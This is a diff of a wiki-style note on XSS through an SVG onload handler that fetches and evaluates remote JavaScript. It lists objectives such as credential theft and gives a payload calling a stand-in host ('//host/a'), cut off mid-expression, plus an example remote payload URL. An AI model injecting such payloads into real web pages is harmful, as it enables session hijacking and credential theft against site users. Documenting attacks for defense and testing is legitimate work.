@@ -29,9 +29,13 @@ Remote JavaScript Injection via SVG Onload Fetch Command is a type of cross-site
 
 Remote JavaScript Injection via SVG Onload Fetch Command is a type of cross-site scripting (XSS) vulnerability that allows an attacker to inject malicious JavaScript code into a web page. This vulnerability can be exploited by an attacker to steal sensitive user information, such as login credentials, or to perform actions on behalf of the user, such as making unauthorized transactions. The attacker can inject remote JavaScript code into a web page by using the SVG Onload Fetch Command, which allows the attacker to load a remote JavaScript file into the victim's browser.
 
+ 
+
 ## Requirements
 
 1. Access to a vulnerable web application
+
+ 
 
 ## Defense
 
@@ -41,6 +45,8 @@ Remote JavaScript Injection via SVG Onload Fetch Command is a type of cross-site
 
 1. Regularly scan web applications for vulnerabilities and apply security patches as needed
 
+ 
+
 ## Objectives
 
 1. Inject malicious JavaScript code into a web page
@@ -49,11 +55,19 @@ Remote JavaScript Injection via SVG Onload Fetch Command is a type of cross-site
 
 1. Perform actions on behalf of the user
 
+ 
+
 # Instructions
 
 1. This command is used to execute arbitrary code on a target website by exploiting a vulnerability in SVG images. The command fetches a payload from a specified URL and then evaluates it using the eval() function. The payload can be specified in the URL by adding /#payload after the URL. For example, 14.rs/#alert(document.domain) will execute an alert with the domain of the target website.
 
+ 
+
+
+
 **Code**: [[<svg/onload='fetch("//host/a").then(r=>r.text().th]]
+
+
 
 > The command has the following arguments:
 - URL: The URL from which the payload will be fetched. This argument is required.
@@ -75,3 +89,5 @@ Remote JavaScript Injection via SVG Onload Fetch Command is a type of cross-site
 - [[Cross Site Scripting]]
 - [[XSS in HTML/Applications]]
 - [[XSS using a remote JS]]
+
+
